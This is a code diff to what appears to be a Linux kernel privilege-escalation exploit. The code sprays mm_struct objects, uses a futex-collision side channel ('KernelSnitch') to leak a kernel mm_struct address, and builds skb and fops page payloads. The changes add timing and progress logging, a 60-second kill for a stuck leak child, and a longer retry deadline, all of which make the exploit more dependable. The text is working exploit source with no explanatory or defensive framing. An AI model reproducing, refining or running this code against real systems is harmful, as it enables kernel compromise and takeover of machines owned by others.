@@ -12,6 +12,13 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+static long long ms_since(struct timespec *t0) {
+  struct timespec now;
+  clock_gettime(CLOCK_MONOTONIC, &now);
+  return (now.tv_sec - t0->tv_sec) * 1000LL +
+         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
+}
+
 uintptr_t page_base;
 uintptr_t last_mm_struct;
 uintptr_t fake_lock;
@@ -602,6 +609,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 }
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+  struct timespec t_spray;
+  clock_gettime(CLOCK_MONOTONIC, &t_spray);
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs(payload_mode);
@@ -622,6 +631,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
+          cpu_count, ms_since(&t_spray));
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -648,10 +659,52 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     kill_child(spray_ctx.childs[i]);
   }
-  SYSCHK(waitpid(child_leak, NULL, 0));
-
+  pr_info("[spray] finding futex collisions... +%lldms\n",
+          ms_since(&t_spray));
+  {
+    struct timespec t_wait;
+    clock_gettime(CLOCK_MONOTONIC, &t_wait);
+    int leak_status = 0;
+    pid_t wp = 0;
+    long long last_beat = 0;
+    for (;;) {
+      wp = waitpid(child_leak, &leak_status, WNOHANG);
+      if (wp == child_leak) {
+        break;
+      }
+      if (wp < 0) {
+        pr_warning("waitpid leak child: %m\n");
+        break;
+      }
+      long long waited = ms_since(&t_wait);
+      if (waited >= 60000) {
+        pr_warning("leak child stuck >60s, killing it\n");
+        kill(child_leak, SIGKILL);
+        waitpid(child_leak, NULL, 0);
+        break;
+      }
+      if (waited - last_beat >= 2000) {
+        size_t scan_done = ks->scan_done;
+        size_t scan_total = ks->total_futexes;
+        if (scan_done > scan_total) scan_done = scan_total;
+        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
+        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
+        pr_info("[spray]   still finding collisions (%llds) %zu%% "
+                "(futex 0x%zx/0x%zx)...\n",
+                waited / 1000,
+                scan_total ? scan_done * 100 / scan_total : 0,
+                scan_id, (size_t)FUTEX_SZ);
+        last_beat = waited;
+      }
+      usleep(50000);
+    }
+    if (wp == child_leak &&
+        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
+      pr_warning("leak child exit status=%d\n", leak_status);
+    }
+  }
   if (!kernelsnitch_found_collisions(ks)) {
-    pr_warning("KernelSnitch collision finding failed\n");
+    pr_warning("[spray] futex collisions not found\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -661,7 +714,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
+  pr_info("[spray] futex collisions found +%lldms\n",
+          ms_since(&t_spray));
   kernelsnitch_bruteforce(ks);
+  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
+          (size_t)ks->mm_struct, ms_since(&t_spray));
   uintptr_t leaked = ks->mm_struct;
   last_mm_struct = leaked;
   if (leaked == (uintptr_t)-1) {
@@ -741,6 +798,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       break;
     }
   }
+  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
@@ -760,13 +818,15 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     max_attempts = 4;
   }
-  struct timespec deadline;
-  clock_gettime(CLOCK_MONOTONIC, &deadline);
-  deadline.tv_sec += 180;
+  struct timespec t_good;
+  clock_gettime(CLOCK_MONOTONIC, &t_good);
+  struct timespec deadline = t_good;
+  deadline.tv_sec += 240;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
     if (base) {
-      pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
+      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+              ms_since(&t_good));
       return base;
     }
     struct timespec now;
@@ -775,7 +835,8 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
       pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
       break;
     }
-    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
+    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
+               max_attempts, ms_since(&t_good));
   }
   return 0;
 }
